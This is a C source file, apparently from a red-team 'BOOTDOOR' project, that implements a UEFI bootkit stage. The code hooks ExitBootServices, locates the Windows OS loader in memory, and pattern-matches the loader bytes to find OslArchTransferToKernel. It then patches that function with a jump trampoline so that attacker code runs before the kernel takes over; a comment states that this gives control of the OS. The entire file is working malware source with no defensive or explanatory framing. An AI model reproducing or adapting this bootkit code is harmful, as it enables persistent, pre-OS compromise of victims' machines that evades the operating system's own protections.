/*!
 *
 * BOOTDOOR
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Installs a hook on OslArchTransferToKernel() and
 * checks if hyper-v is being loaded.
 *
!*/
D_SEC( B ) EFI_STATUS EFIAPI ExitBootServices( EFI_HANDLE ImageHandle, UINTN Key )
{
	SIZE_T			Len = 0;

	PVOID			Fcn = NULL;
	PBYTE			Ptr = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;
	PIMAGE_DATA_DIRECTORY	Dir = NULL;
	PIMAGE_EXPORT_DIRECTORY	Exp = NULL;

	Dos = C_PTR( U_PTR( __builtin_extract_return_addr( __builtin_return_address( 0 ) ) ) );
	Dos = C_PTR( U_PTR( U_PTR( Dos ) &~ ( 0x1000 - 1 ) ) );

	do 
	{
		/* Has MZ Signature */
		if ( Dos->e_magic == IMAGE_DOS_SIGNATURE ) {
			if ( Dos->e_lfanew < 0x100 ) {
				Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
				if ( Nth->Signature == IMAGE_NT_SIGNATURE ) {
					/* Success */ break;
				};
			};
		};
		Dos = C_PTR( U_PTR( Dos ) - 0x1000 );
	} while ( TRUE );

	/* Get pointer to the potential export directory */
	Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	/* Does EAT Exist? */
	if ( Dir->VirtualAddress != 0 ) {
		/* Pointer to EAT */
		Exp = C_PTR( U_PTR( Dos ) + Dir->VirtualAddress );

		/* Match any of these names? */
		if ( HashString( C_PTR( U_PTR( Dos ) + Exp->Name ), 0 ) == 0x8deb5a3a ||
		     HashString( C_PTR( U_PTR( Dos ) + Exp->Name ), 0 ) == 0x64255bfd ||
		     HashString( C_PTR( U_PTR( Dos ) + Exp->Name ), 0 ) == 0x64259d80 )
		{
			Sec = IMAGE_FIRST_SECTION( Nth );
			for ( INT Idx = 0 ; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
				if ( HashString( &Sec[ Idx ].Name, 0 ) == 0x0b6ea858 ) {
					for ( INT Jdx = 0 ; Jdx < Sec[ Idx ].SizeOfRawData ; ++Jdx ) {
						Ptr = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress + Jdx );

						if ( Ptr[ 0x00 ] == 0x33 && Ptr[ 0x01 ] == 0xf6 &&
						     Ptr[ 0x15 ] == 0x48 && Ptr[ 0x16 ] == 0x8d && Ptr[ 0x17 ] == 0x05 &&
						     Ptr[ 0x1c ] == 0x48 && Ptr[ 0x1d ] == 0x8d && Ptr[ 0x1e ] == 0x0d &&
						     Ptr[ 0x23 ] == 0x0f && Ptr[ 0x24 ] == 0x01 && Ptr[ 0x25 ] == 0x10 &&
						     Ptr[ 0x26 ] == 0x0f && Ptr[ 0x27 ] == 0x01 && Ptr[ 0x28 ] == 0x19 )
						{
							Fcn = C_PTR( Ptr );
							Len = 14;
							break;
						};
						if ( Ptr[ 0x00 ] == 0x33 && Ptr[ 0x01 ] == 0xf6 &&
						     Ptr[ 0x17 ] == 0x48 && Ptr[ 0x18 ] == 0x8d && Ptr[ 0x19 ] == 0x05 &&
						     Ptr[ 0x1e ] == 0x48 && Ptr[ 0x1f ] == 0x8d && Ptr[ 0x20 ] == 0x0d &&
						     Ptr[ 0x25 ] == 0x0f && Ptr[ 0x26 ] == 0x01 && Ptr[ 0x27 ] == 0x10 &&
						     Ptr[ 0x28 ] == 0x0f && Ptr[ 0x29 ] == 0x01 && Ptr[ 0x2a ] == 0x19 )
						{
							Fcn = C_PTR( Ptr );
							Len = 16;
							break;
						};
					};
				};
			};
			if ( Fcn != NULL && Len != 0 ) {
				__builtin_memcpy( C_PTR( G_PTR( OslCg ) ), Fcn, Len );

				*( PUINT16 )( C_PTR( U_PTR( Fcn ) + 0x00 ) ) = ( UINT16 )( 0x25ff );
				*( PUINT32 )( C_PTR( U_PTR( Fcn ) + 0x02 ) ) = ( UINT32 )( 0 );
				*( PUINT64 )( C_PTR( U_PTR( Fcn ) + 0x06 ) ) = ( UINT64 )( C_PTR( G_PTR( OslArchTransferToKernel ) ) );
				*( PUINT16 )( C_PTR( U_PTR( G_PTR( OslCg ) + Len + 0x00 ) ) ) = ( UINT16 )( 0x25ff );
				*( PUINT32 )( C_PTR( U_PTR( G_PTR( OslCg ) + Len + 0x02 ) ) ) = ( UINT32 )( 0 );
				*( PUINT64 )( C_PTR( U_PTR( G_PTR( OslCg ) + Len + 0x06 ) ) ) = ( UINT64 )( C_PTR( U_PTR( Fcn ) + Len ) );
			};
		};
	};

	/* Execute original function: By now, we can control the OS */
	return ( ( __typeof__( ExitBootServices ) * )( ( ( PEFTBL ) G_PTR( EfTbl ) )->ExitBootServices ) )(
			ImageHandle, Key
	);
};
